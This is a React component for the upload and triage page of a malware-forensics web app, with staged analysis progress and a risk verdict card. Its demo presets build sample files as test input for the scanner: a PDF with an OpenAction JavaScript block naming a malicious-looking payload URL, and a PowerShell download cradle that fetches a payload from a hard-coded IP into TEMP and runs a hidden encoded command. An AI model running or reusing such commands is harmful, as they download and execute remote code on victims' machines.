import React, { useState, useRef } from 'react';
import {
  Upload,
  AlertCircle,
  ShieldAlert,
  ArrowRight,
  CheckCircle2,
  RefreshCw,
  FileCode,
  Network,
  Shield,
  ChevronDown,
  ChevronUp,
  Copy,
  Check,
  Sparkles,
} from 'lucide-react';
import { api } from '../services/api';
import { InvestigationSummary, EvidenceItem } from '../types';
import { ScanVerdictModal } from '../components/modals/ScanVerdictModal';

interface InvestigateProps {
  onInvestigationComplete: (id: string) => void;
  onNavigateToGraph: (id: string) => void;
  onNavigateToDetails: (id: string) => void;
  onNavigateToDefense?: (id: string) => void;
}

export const Investigate: React.FC<InvestigateProps> = ({
  onInvestigationComplete,
  onNavigateToGraph,
  onNavigateToDetails,
  onNavigateToDefense,
}) => {
  const [selectedFile, setSelectedFile] = useState<File | null>(null);
  const [previewSha256, setPreviewSha256] = useState<string | null>(null);
  const [dragActive, setDragActive] = useState(false);
  const [analyzing, setAnalyzing] = useState(false);
  const [currentStage, setCurrentStage] = useState<number>(0);
  const [error, setError] = useState<string | null>(null);
  const [result, setResult] = useState<InvestigationSummary | null>(null);
  const [evidence, setEvidence] = useState<EvidenceItem[]>([]);
  const [showPopup, setShowPopup] = useState(false);
  const [showTechnicalDetails, setShowTechnicalDetails] = useState(false);
  const [copiedHash, setCopiedHash] = useState(false);
  const inputRef = useRef<HTMLInputElement>(null);

  const calculateFileSha256 = async (file: File) => {
    try {
      const buffer = await file.arrayBuffer();
      const hashBuffer = await crypto.subtle.digest('SHA-256', buffer);
      const hashArray = Array.from(new Uint8Array(hashBuffer));
      const hashHex = hashArray.map((b) => b.toString(16).padStart(2, '0')).join('');
      setPreviewSha256(hashHex);
    } catch {
      setPreviewSha256(null);
    }
  };

  const handleSelectFile = (file: File) => {
    setSelectedFile(file);
    calculateFileSha256(file);
    setError(null);
    setResult(null);
  };

  const handleLoadDemoSample = (sampleType: 'exploit_pdf' | 'ps1_script' | 'benign_pdf') => {
    let file: File;
    if (sampleType === 'exploit_pdf') {
      const content = '%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [] /Count 0 >>\nendobj\n4 0 obj\n<< /Type /Action /S /JavaScript /JS (app.alert("http://malicious-c2-update.org/payload.exe");) >>\nendobj\nxref\n0 5\n0000000000 65535 f\n0000000009 00000 n\n0000000074 00000 n\n0000000133 00000 n\n0000000204 00000 n\ntrailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n340\n%%EOF';
      file = new File([content], 'urgent_invoice_action.pdf', { type: 'application/pdf' });
    } else if (sampleType === 'ps1_script') {
      const content = '$wc = New-Object System.Net.WebClient\n$wc.DownloadFile("http://185.196.11.42/payload.bin", "$env:TEMP\\agent.exe")\npowershell -w hidden -enc aQB3AHIA...';
      file = new File([content], 'system_update_cradle.ps1', { type: 'text/x-script' });
    } else {
      const content = '%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [] /Count 0 >>\nendobj\nxref\n0 3\n0000000000 65535 f\n0000000009 00000 n\n0000000058 00000 n\ntrailer\n<< /Size 3 /Root 1 0 R >>\nstartxref\n110\n%%EOF';
      file = new File([content], 'academic_research_proposal.pdf', { type: 'application/pdf' });
    }
    handleSelectFile(file);
  };

  const stages = [
    'Secure Ingestion & SHA-256 Nonce Verification',
    'Static Header & Magic Byte Validation',
    'YARA Signature Pattern Compilation & Matching',
    '14-Dimensional Structural Vector Engineering',
    'Supervised Random Forest & Isolation Forest Inference',
    'Causal Attack-Chain Topology Construction',
    'Forensic Incident Report Compilation',
  ];

  const handleFileDrop = (e: React.DragEvent) => {
    e.preventDefault();
    setDragActive(false);
    if (e.dataTransfer.files && e.dataTransfer.files[0]) {
      handleSelectFile(e.dataTransfer.files[0]);
    }
  };

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files[0]) {
      handleSelectFile(e.target.files[0]);
    }
  };

  const startAnalysis = async () => {
    if (!selectedFile) return;

    try {
      setAnalyzing(true);
      setError(null);
      setResult(null);

      // Visual progress feedback
      let stageTimer = 0;
      const interval = setInterval(() => {
        stageTimer += 1;
        if (stageTimer < stages.length) {
          setCurrentStage(stageTimer);
        }
      }, 350);

      const uploadRes = await api.analyzeFile(selectedFile);
      clearInterval(interval);

      const [invDetail, evList] = await Promise.all([
        api.getInvestigation(uploadRes.id),
        api.getEvidence(uploadRes.id),
      ]);
      setResult(invDetail);
      setEvidence(evList || []);
      onInvestigationComplete(invDetail.id);

      // Trigger the interactive verdict popup card!
      setShowPopup(true);
    } catch (err: any) {
      console.error(err);
      setError(err.message || 'File forensics processing error. Please verify backend is running.');
    } finally {
      setAnalyzing(false);
      setCurrentStage(0);
    }
  };

  return (
    <div className="space-y-6 max-w-5xl mx-auto pb-10">
      {/* Header and Sample Presets */}
      <div className="p-6 rounded-3xl border border-slate-200 bg-white flex flex-col md:flex-row md:items-center justify-between gap-4 shadow-xs">
        <div>
          <div className="flex items-center gap-2">
            <h1 className="text-xl font-bold text-slate-900 flex items-center gap-2">
              <ShieldAlert className="w-5 h-5 text-indigo-600" />
              <span>Multi-Layer File Forensics & Triage</span>
            </h1>
            <span className="text-[10px] uppercase font-bold px-2.5 py-0.5 rounded-full bg-indigo-50 text-indigo-700 border border-indigo-200">
              Sandboxed
            </span>
          </div>
          <p className="text-xs text-slate-500 mt-1">
            Safely inspect suspicious PDFs, binaries, macros, and scripts in an isolated virtual execution barrier.
          </p>
        </div>

        {/* Quick Sample Presets */}
        <div className="flex items-center gap-2 shrink-0 flex-wrap">
          <span className="text-xs text-slate-400 font-medium">Quick Presets:</span>
          <button
            onClick={() => handleLoadDemoSample('benign_pdf')}
            className="px-3 py-1.5 rounded-xl border border-slate-200 bg-slate-50 hover:bg-slate-100 text-slate-700 text-xs font-semibold cursor-pointer transition-colors"
          >
            Clean PDF
          </button>
          <button
            onClick={() => handleLoadDemoSample('exploit_pdf')}
            className="px-3 py-1.5 rounded-xl border border-rose-200 bg-rose-50 hover:bg-rose-100 text-rose-700 text-xs font-semibold cursor-pointer transition-colors"
          >
            Exploit PDF
          </button>
          <button
            onClick={() => handleLoadDemoSample('ps1_script')}
            className="px-3 py-1.5 rounded-xl border border-amber-200 bg-amber-50 hover:bg-amber-100 text-amber-700 text-xs font-semibold cursor-pointer transition-colors"
          >
            PowerShell Stager
          </button>
        </div>
      </div>

      {/* Drag & Drop Zone */}
      <div
        onDragOver={(e) => {
          e.preventDefault();
          setDragActive(true);
        }}
        onDragLeave={() => setDragActive(false)}
        onDrop={handleFileDrop}
        onClick={() => inputRef.current?.click()}
        className={`p-10 rounded-3xl border-2 border-dashed text-center transition-all cursor-pointer bg-white shadow-xs ${
          dragActive
            ? 'border-indigo-500 bg-indigo-50/60 scale-[1.01]'
            : selectedFile
            ? 'border-indigo-400 bg-indigo-50/20'
            : 'border-slate-300 hover:border-indigo-400 hover:bg-slate-50/60'
        }`}
      >
        <input
          ref={inputRef}
          type="file"
          onChange={handleFileChange}
          className="hidden"
        />

        <div className="w-14 h-14 rounded-2xl border border-indigo-100 bg-indigo-50 flex items-center justify-center mx-auto mb-3 text-indigo-600 shadow-xs">
          <Upload className="w-7 h-7 text-indigo-600" />
        </div>

        {selectedFile ? (
          <div className="space-y-1.5">
            <div className="text-base font-bold text-slate-900 flex items-center justify-center gap-2">
              <FileCode className="w-5 h-5 text-indigo-600" />
              <span>{selectedFile.name}</span>
            </div>
            <div className="text-xs text-slate-500 font-mono">
              Size: {(selectedFile.size / 1024).toFixed(1)} KB • Type: {selectedFile.type || 'Binary / Unspecified'}
            </div>
            {previewSha256 && (
              <div className="text-[11px] font-mono text-slate-500 pt-1">
                SHA-256: <span className="text-slate-800 select-all font-semibold">{previewSha256}</span>
              </div>
            )}
            <div className="text-[11px] text-slate-400 pt-2 font-mono">
              Click or drag another file to replace
            </div>
          </div>
        ) : (
          <div>
            <div className="text-base font-bold text-slate-900">
              Select or drag and drop a suspicious sample here
            </div>
            <div className="text-xs text-slate-500 mt-1">
              Click to browse your local filesystem (Max 100MB)
            </div>
          </div>
        )}
      </div>

      {/* Action Buttons */}
      {selectedFile && !analyzing && !result && (
        <div className="flex items-center justify-end gap-3">
          <button
            onClick={() => setSelectedFile(null)}
            className="px-4 py-2 rounded-xl border border-slate-200 hover:bg-slate-100 text-xs font-semibold text-slate-600 cursor-pointer transition-colors"
          >
            Clear Selection
          </button>
          <button
            onClick={startAnalysis}
            className="flex items-center gap-2 px-5 py-2.5 rounded-xl bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white text-xs font-semibold shadow-md shadow-indigo-500/20 cursor-pointer transition-all active:scale-95"
          >
            <ShieldAlert className="w-4 h-4 text-white" />
            <span>Execute Forensic Analysis</span>
          </button>
        </div>
      )}

      {/* Error Banner */}
      {error && (
        <div className="p-4 rounded-2xl bg-rose-50 border border-rose-200 text-rose-800 text-xs flex items-center gap-3">
          <AlertCircle className="w-5 h-5 shrink-0 text-rose-600" />
          <span>{error}</span>
        </div>
      )}

      {/* Analysis Progress */}
      {analyzing && (
        <div className="p-6 rounded-3xl border border-slate-200 bg-white space-y-4 shadow-xs">
          <div className="flex items-center justify-between text-xs">
            <span className="font-bold text-slate-900 flex items-center gap-2">
              <RefreshCw className="w-4 h-4 text-indigo-600 animate-spin" />
              <span>Analyzing Sample: {selectedFile?.name}</span>
            </span>
            <span className="text-indigo-600 font-mono text-[11px] font-bold">
              Stage {Math.min(currentStage + 1, stages.length)} / {stages.length}
            </span>
          </div>

          {/* Progress Bar */}
          <div className="w-full bg-slate-100 rounded-full h-2 overflow-hidden border border-slate-200">
            <div
              className="bg-indigo-600 h-2 rounded-full transition-all duration-300"
              style={{ width: `${((currentStage + 1) / stages.length) * 100}%` }}
            ></div>
          </div>

          {/* Stages List */}
          <div className="grid grid-cols-1 gap-1.5 pt-1 text-xs">
            {stages.map((st, i) => {
              const isPast = i < currentStage;
              const isCurr = i === currentStage;
              return (
                <div
                  key={i}
                  className={`flex items-center gap-2.5 px-3 py-2 rounded-xl text-[11px] transition-colors ${
                    isCurr
                      ? 'bg-indigo-50 text-indigo-900 font-bold border border-indigo-200'
                      : isPast
                      ? 'text-slate-600'
                      : 'text-slate-400'
                  }`}
                >
                  {isPast ? (
                    <CheckCircle2 className="w-4 h-4 text-emerald-600 shrink-0" />
                  ) : isCurr ? (
                    <RefreshCw className="w-4 h-4 text-indigo-600 animate-spin shrink-0" />
                  ) : (
                    <div className="w-3.5 h-3.5 rounded-full border border-slate-300 shrink-0"></div>
                  )}
                  <span>{st}</span>
                </div>
              );
            })}
          </div>
        </div>
      )}

      {/* Analysis Result Card */}
      {result && (
        <div className="p-6 rounded-3xl border border-slate-200 bg-white space-y-5 shadow-xs">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-4 border-b border-slate-100">
            <div>
              <div className="text-[10px] text-slate-400 uppercase tracking-wider font-mono">Triage Complete</div>
              <h2 className="text-base font-bold text-slate-900">{result.original_name}</h2>
              <div className="flex items-center gap-1.5 text-[11px] text-slate-500 font-mono mt-0.5">
                <span>SHA-256: {result.sha256}</span>
                <button
                  type="button"
                  onClick={() => {
                    navigator.clipboard.writeText(result.sha256);
                    setCopiedHash(true);
                    setTimeout(() => setCopiedHash(false), 2000);
                  }}
                  className="p-1 rounded-lg hover:bg-slate-100 text-slate-400 hover:text-slate-700 cursor-pointer transition-colors"
                  title="Copy SHA-256 hash"
                >
                  {copiedHash ? <Check className="w-3.5 h-3.5 text-emerald-600" /> : <Copy className="w-3.5 h-3.5" />}
                </button>
              </div>
            </div>

            <div className="flex items-center gap-2 self-start sm:self-auto">
              <span className={`text-xs font-bold font-mono px-3.5 py-1.5 rounded-xl border ${
                result.risk_level === 'CRITICAL' ? 'bg-rose-50 text-rose-700 border-rose-200' :
                result.risk_level === 'HIGH' ? 'bg-orange-50 text-orange-700 border-orange-200' :
                result.risk_level === 'MEDIUM' ? 'bg-amber-50 text-amber-700 border-amber-200' :
                'bg-emerald-50 text-emerald-700 border-emerald-200'
              }`}>
                {result.risk_score} / 100 • {result.risk_level} RISK
              </span>
            </div>
          </div>

          {/* Metrics Overview */}
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
            <div className="p-3.5 rounded-2xl bg-slate-50 border border-slate-200 text-xs">
              <span className="text-slate-500 text-[11px]">File Size</span>
              <div className="text-sm font-bold text-slate-900 mt-0.5 font-mono">
                {(result.file_size_bytes / 1024).toFixed(1)} KB
              </div>
            </div>
            <div className="p-3.5 rounded-2xl bg-slate-50 border border-slate-200 text-xs">
              <span className="text-slate-500 text-[11px]">Format / MIME</span>
              <div className="text-sm font-bold text-slate-900 mt-0.5 truncate">{result.file_type}</div>
            </div>
            <div className="p-3.5 rounded-2xl bg-slate-50 border border-slate-200 text-xs">
              <span className="text-slate-500 text-[11px]">Model Confidence</span>
              <div className="text-sm font-bold text-slate-900 mt-0.5 font-mono">
                {(result.confidence_score * 100).toFixed(0)}%
              </div>
            </div>
            <div className="p-3.5 rounded-2xl bg-slate-50 border border-slate-200 text-xs">
              <div className="flex items-center justify-between">
                <span className="text-slate-500 text-[11px]">Analysis Coverage</span>
                <span className="text-[10px] text-slate-400 font-mono">
                  {(result.coverage_score * 100) >= 95 ? 'Full Surface' : 'Multi-Layer'}
                </span>
              </div>
              <div className="text-sm font-bold text-slate-900 mt-0.5 font-mono">
                {(result.coverage_score * 100).toFixed(0)}%
              </div>
            </div>
          </div>

          {/* AI Executive Summary */}
          {result.summary && (
            <div className="p-4 rounded-2xl bg-slate-50 border border-slate-200 text-xs space-y-1.5">
              <div className="font-bold text-slate-900">Executive Forensic Summary</div>
              <p className="text-slate-600 leading-relaxed text-[11px]">{result.summary}</p>
            </div>
          )}

          {/* Expandable Technical Details Preview */}
          <div className="pt-2">
            <button
              onClick={() => setShowTechnicalDetails(!showTechnicalDetails)}
              className="flex items-center gap-1.5 text-xs text-indigo-600 hover:text-indigo-800 font-semibold cursor-pointer"
            >
              {showTechnicalDetails ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
              <span>{showTechnicalDetails ? 'Hide Evaluation Parameters' : 'Show Evaluation Parameters & Hash Verifications'}</span>
            </button>

            {showTechnicalDetails && (
              <div className="mt-3 p-4 rounded-2xl bg-slate-50 border border-slate-200 text-[11px] space-y-2 font-mono text-slate-700">
                <div className="flex justify-between border-b border-slate-200 pb-1">
                  <span className="text-slate-500">Investigation UUID:</span>
                  <span>{result.id}</span>
                </div>
                <div className="flex justify-between border-b border-slate-200 pb-1">
                  <span className="text-slate-500">Cryptographic SHA-256:</span>
                  <span className="truncate max-w-[340px]">{result.sha256}</span>
                </div>
                <div className="flex justify-between border-b border-slate-200 pb-1">
                  <span className="text-slate-500">Ingestion Timestamp:</span>
                  <span>{result.created_at}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-slate-500">Quarantine Storage Mode:</span>
                  <span className="text-slate-900 font-bold">NON-EXECUTABLE (000 PERMISSIONS)</span>
                </div>
              </div>
            )}
          </div>

          {/* Action Row */}
          <div className="flex flex-wrap items-center justify-between gap-3 pt-3 border-t border-slate-100">
            <button
              onClick={() => {
                setSelectedFile(null);
                setResult(null);
              }}
              className="px-4 py-2 rounded-xl border border-slate-200 hover:bg-slate-100 text-slate-700 text-xs font-semibold cursor-pointer transition-colors"
            >
              Scan Another File
            </button>

            <div className="flex items-center gap-2">
              {onNavigateToDefense && (
                <button
                  onClick={() => onNavigateToDefense(result.id)}
                  className="flex items-center gap-1.5 px-3.5 py-2 rounded-xl border border-slate-200 bg-slate-50 hover:bg-indigo-50 hover:text-indigo-700 hover:border-indigo-200 text-slate-700 text-xs font-semibold cursor-pointer transition-colors"
                >
                  <Shield className="w-4 h-4" />
                  <span>Defensive Simulation</span>
                </button>
              )}

              <button
                onClick={() => onNavigateToGraph(result.id)}
                className="flex items-center gap-1.5 px-3.5 py-2 rounded-xl border border-slate-200 bg-slate-50 hover:bg-indigo-50 hover:text-indigo-700 hover:border-indigo-200 text-slate-700 text-xs font-semibold cursor-pointer transition-colors"
              >
                <Network className="w-4 h-4" />
                <span>Attack Graph</span>
              </button>

              <button
                onClick={() => onNavigateToDetails(result.id)}
                className="flex items-center gap-1.5 px-5 py-2 rounded-xl bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white text-xs font-semibold shadow-sm cursor-pointer"
              >
                <span>Inspect Evidence Items</span>
                <ArrowRight className="w-4 h-4 text-white stroke-[2.5]" />
              </button>
            </div>
          </div>
        </div>
      )}

      {/* POPUP MODAL: Clean File vs Warning on Threats (Explains what is the problem in the file) */}
      <ScanVerdictModal
        isOpen={showPopup}
        onClose={() => setShowPopup(false)}
        verdict={result}
        evidence={evidence}
        onNavigateToDetails={onNavigateToDetails}
        onNavigateToDefense={onNavigateToDefense}
      />
    </div>
  );
};
